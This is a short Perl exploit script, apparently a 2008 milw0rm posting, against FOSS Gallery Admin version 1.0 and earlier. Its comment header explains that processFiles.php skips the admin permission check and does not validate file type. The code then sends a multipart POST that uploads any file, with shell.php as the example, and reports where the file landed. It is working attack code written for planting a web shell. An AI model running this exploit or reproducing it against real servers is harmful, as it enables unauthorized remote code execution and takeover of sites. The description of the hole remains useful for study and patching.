#!/usr/bin/perl

# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# FOSS Gallery Admin Version <= 1.0 / Remote Arbitrary Upload Vulnerability
# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
# Program: FOSS Gallery Admin Version
# Version: <= 1.0
# File affected: processFiles.php
# Download: http://sourceforge.net/projects/fossgallery/
#
#
# Found by Pepelux <pepelux[at]enye-sec.org>
# eNYe-Sec - www.enye-sec.org
#
# Upload images is only allowed to the admin but the process to upload has
# 3 steps (with 3 pages). only the first page check the user permissions.
#
# STEPS:
# uploadForm1.php -> ask for the number of files you wish to upload
# uploadForm2.php -> ask for the files to upload
# processFiles.php -> process the file(s)
#
# Also image format is not validated and you can upload any file.
#
# You can POST directly in the 3th step (processFiles.php):
# - uploadNeed = 1 ... we only need to upload 1 file
# - uploadFile0 = shell.php ... the file to upload



use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Headers;

my ($host, $file) = @ARGV ;



unless($ARGV[1]){

	print "\nUsage: perl $0 <host> <file_to_upload>\n";

	print "\tex: perl $0 http://localhost shell.php\n\n";

	exit 1;

}


$host = 'http://'.$host if ($host !~ /^http:/);

$host .= "/" if ($host !~ /\/\$/);


my $ua = LWP::UserAgent->new();
$ua->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008072820 Firefox/3.0.1");

$ua->timeout(10);

my $request = HTTP::Request->new();
my $response;
my $header;
my $url = $host."processFiles.php";

$response = $ua->request(POST $url, Content_Type => 'form-data',
					Content => [ uploadNeed => "1", uploadFile0 => [$file]]);

$content = $response->content;



if ($content =~ /uploaded sucessful/) { print "\nExploited sucessfully. File located in:\n".$host.$file."\n"; }
else { print "\nExploit failed\n"; }


exit;

# milw0rm.com [2008-10-04]